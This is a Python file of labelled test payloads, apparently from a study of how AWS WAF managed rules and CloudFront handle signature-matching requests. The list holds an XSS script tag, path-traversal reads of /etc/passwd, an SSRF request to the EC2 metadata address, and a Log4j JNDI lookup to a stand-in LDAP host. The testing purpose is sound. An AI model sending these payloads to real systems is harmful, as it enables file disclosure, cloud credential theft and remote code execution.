"""Scenario S4 payload classes.

Each entry is a request shaped to match one named rule in an AWS managed rule
group. Rule names and labels are taken verbatim from AWS documentation (see
docs/aws-facts.md), so the analysis can report WHICH rule fired rather than
only that something was blocked.

Every payload is sent only to the researcher's own endpoint. The target Lambda
returns a fixed response and never parses, evaluates, stores or reflects any
input, so none of these is exploitable against anything. They exist to give
signature-based rules something real to match.
"""

# Percent-encoding is REQUIRED, not cosmetic.
#
# Raw `<`, `>`, `{` and `}` are not legal URI characters. Sent raw, CloudFront
# and API Gateway reject the request with 400 before the WAF evaluates it --
# so the payload would measure URI validation rather than signature matching,
# and C1/C2 would appear to "block" requests they never inspected.
#
# Percent-encoded, the payload traverses the stack intact AND still matches the
# managed rule, because AWS WAF applies a URL-decode transformation before
# inspection. Verified 2026-09-28: encoded xss-query and log4j-query return
# 200 at C2 and 403 at C3, which is the behaviour the design requires.
#
# (label, uri_path, headers, expected_rule, expected_label)
#
# headers value of None for a key means "omit this header entirely". Note that
# omitting the key from the dict is NOT sufficient -- see ADR 0003.
S4_PAYLOADS = [
    (
        "xss-query",
        "/api/items?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        {},
        "CrossSiteScripting_QUERYARGUMENTS",
        "awswaf:managed:aws:core-rule-set:CrossSiteScripting_QueryArguments",
    ),
    (
        "lfi-query",
        "/api/items?file=../../../../etc/passwd",
        {},
        "GenericLFI_QUERYARGUMENTS",
        "awswaf:managed:aws:core-rule-set:GenericLFI_QueryArguments",
    ),
    (
        "ssrf-metadata",
        "/api/items?url=http://169.254.169.254/latest/meta-data/",
        {},
        "EC2MetaDataSSRF_QUERYARGUMENTS",
        "awswaf:managed:aws:core-rule-set:EC2MetaDataSSRF_QueryArguments",
    ),
    (
        "log4j-query",
        "/api/items?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.com%2Fa%7D",
        {},
        "Log4JRCE_QUERYSTRING",
        "awswaf:managed:aws:known-bad-inputs:Log4JRCE_QueryString",
    ),
    (
        "bad-user-agent",
        "/api/items",
        {"User-Agent": "nmap"},
        "UserAgent_BadBots_HEADER",
        "awswaf:managed:aws:core-rule-set:BadBots_Header",
    ),
    (
        "no-user-agent",
        "/api/items",
        {"User-Agent": None},
        "NoUserAgent_HEADER",
        "awswaf:managed:aws:core-rule-set:NoUserAgent_Header",
    ),
    (
        "restricted-ext",
        "/api/items?f=config.ini",
        {},
        "RestrictedExtensions_QUERYARGUMENTS",
        "awswaf:managed:aws:core-rule-set:RestrictedExtensions_QueryArguments",
    ),
]

# ---------------------------------------------------------------------------
# Retained but measured SEPARATELY, not as part of the S4 blocking ratio.
#
# CloudFront rejects `..` path segments with 400 at the edge, in every
# configuration including C2, and in both raw and percent-encoded form. The
# request never reaches the WAF, so GenericLFI_URIPATH cannot be exercised
# behind CloudFront at all.
#
# That is a finding rather than a defect: CloudFront alone provides
# path-traversal rejection that a CloudFront-only deployment gets for free,
# which contradicts the naive expectation that C2 contributes no filtering.
# It is reported as edge behaviour, not as a WAF result. Path-traversal
# coverage in the S4 blocking set comes from lfi-query instead, which does
# reach the WAF (200 at C2, 403 at C3).
EDGE_PROBES = [
    (
        "lfi-path",
        "/api/../../etc/passwd",
        {},
        "GenericLFI_URIPATH (unreachable behind CloudFront)",
        "awswaf:managed:aws:core-rule-set:GenericLFI_URIPath",
    ),
]

# Benign request used by the legitimate client in every scenario, and as the
# attacker payload in S2 and S3. It carries no signature of any kind, which is
# what makes a block in those scenarios attributable to rate alone.
BENIGN_PATH = "/api/items"
BENIGN_HEADERS = {"User-Agent": "ddos-eval-client/1.0"}
